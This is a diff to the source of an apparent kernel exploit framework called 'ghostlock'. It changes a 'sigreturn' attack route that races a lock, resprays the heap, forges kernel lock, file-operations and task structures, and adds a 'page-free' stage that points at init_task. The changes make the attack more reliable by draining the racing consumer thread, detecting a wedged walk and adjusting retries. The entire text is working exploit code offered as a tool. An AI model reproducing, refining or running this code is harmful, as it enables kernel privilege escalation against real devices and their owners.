@@ -105,7 +105,9 @@ namespace ghostlock::route::sigreturn {
 
     void SigreturnRoute::disarm() noexcept {
         race->consumer_go.store(0);
-        if (race->consumer_inflight.load() != 0) {
+        /* A call the attempt loop already found wedged is not waited on twice;
+         * this poll itself writes over the frame that walk is reading. */
+        if (!consumer_stuck && race->consumer_inflight.load() != 0) {
             for (int32_t i = 0;
                  i < 2000 && race->consumer_inflight.load() != 0;
                  i++) {
@@ -154,6 +156,7 @@ namespace ghostlock::route::sigreturn {
 
 #include "route/lock_anchor.h"
 #include "route/route_lifecycle.hpp"
+#include "route/route_policy.hpp"
 #include "support/decls.hpp"
 
 using namespace ghostlock;
@@ -454,7 +457,7 @@ namespace ghostlock::route::sigreturn {
                 static_cast<unsigned long long>(stamp.left),
                 static_cast<unsigned long long>(request->target));
         const memory::WaiterWords words = memory::waiter_words(
-            stamp_layout, (session::g_exploit_session.heap.current.fake_task), lock,
+            stamp_layout, ghostlock::profile::slide_init_task(), lock,
             kernel::waiter_prio_word(
                     kernel::FAKE_WAITER_PRIO,
                     session::g_exploit_session.profile.compact_waiter_has_wake_state()));
@@ -470,9 +473,12 @@ namespace ghostlock::route::sigreturn {
     }
 
     int32_t SigreturnRoute::prepare() noexcept {
-        if (!(session::g_exploit_session.heap.current.base) ||
-            !(session::g_exploit_session.heap.current.fake_lock) ||
-            !(session::g_exploit_session.heap.current.fake_fops)) {
+        /* Page-free Stage 3: the page verdict does not exist in this mode
+         * (lock = profile anchor, task = init_task, no credential copy). */
+        if (!support::page_free_run() &&
+            (!(session::g_exploit_session.heap.current.base) ||
+             !(session::g_exploit_session.heap.current.fake_lock) ||
+             !(session::g_exploit_session.heap.current.fake_fops))) {
             pr_warning("sigreturn route missing kernel page base=%016zx lock=%016zx "
                        "fops=%016zx\n", (session::g_exploit_session.heap.current.base),
                        (session::g_exploit_session.heap.current.fake_lock),
@@ -527,13 +533,17 @@ namespace ghostlock::route::sigreturn {
             if (attempt > 1) {
                 /* A lost race clobbers the reclaimed page, so every retry
                  * resprays and re-derives fake_* before the strip is rebuilt
-                 * (and before a new anchor slot is drawn). */
-                const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
-                if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
-                    !(session::g_exploit_session.heap.current.fake_fops)) {
-                    pr_warning("sigreturn retry page prepare failed attempt=%d\n", attempt);
-                    (void) fail(35, errno);
-                    break;
+                 * (and before a new anchor slot is drawn). Page-free Stage 3:
+                 * no page exists to clobber; the retry only re-stamps, which
+                 * draws a fresh anchor slot. */
+                if (!support::page_free_run()) {
+                    const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
+                    if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
+                        !(session::g_exploit_session.heap.current.fake_fops)) {
+                        pr_warning("sigreturn retry page prepare failed attempt=%d\n", attempt);
+                        (void) fail(35, errno);
+                        break;
+                    }
                 }
                 if (!build_stamp(attempt)) {
                     (void) fail(34, ENOSPC);
@@ -554,25 +564,40 @@ namespace ghostlock::route::sigreturn {
                     static_cast<unsigned long long>(lock_word),
                     static_cast<long long>(now_us_since(route_t0) / 1000));
             stamp_window(route_t0);
+            /* The walk reads this thread's stack and outlives the window; drain
+             * it before anything writes over that stack. */
+            const int32_t drain_ms =
+                    race->wait_consumer_idle(ghostlock::race::PiRace::kConsumerDrainMs);
+            if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
+                int32_t disarm_errno = 0;
+                (void) support::ghost_disarm("attempt", &disarm_errno);
+            }
             /* `stamps` is the handler's patch count (one per trigger signal, so
              * always 1 here). The loop's own copy count is the trampoline's
              * counter -- without it, "did the loop actually run?" costs a trace. */
             pr_info("sigreturn post-stamp attempt=%d/%d stamps=%d copies=%lu misses=%d "
-                    "path_sve=%d +%lldms\n",
+                    "path_sve=%d drain=%dms +%lldms\n",
                     attempt, kAttempts, g_patched - patched_before,
                     ghostlock_loop_stamps, g_misses,
-                    g_last_path_sve,
+                    g_last_path_sve, drain_ms,
                     static_cast<long long>(now_us_since(route_t0) / 1000));
-            race->consumer_go.store(0);
 
             const int32_t calls = race->consumer_calls.load();
             const int32_t successes = race->consumer_success.load();
             calls_total += calls;
             successes_total += successes;
-            if (calls > 0 && successes > 0) {
+            if (drain_ms >= 0 && calls > 0 && successes > 0) {
                 status.code = ROUTE_OK;
                 status.step = 0;
                 status.error_number = 0;
+                break;
+            }
+            if (drain_ms < 0) {
+                /* A wedged walk: another attempt would only pour more writes
+                 * over it. */
+                consumer_stuck = 1;
+                (void) fail(38, 0);
+                status.code = ROUTE_DIRTY_FAILURE;
                 break;
             }
             (void) fail(33, 0);
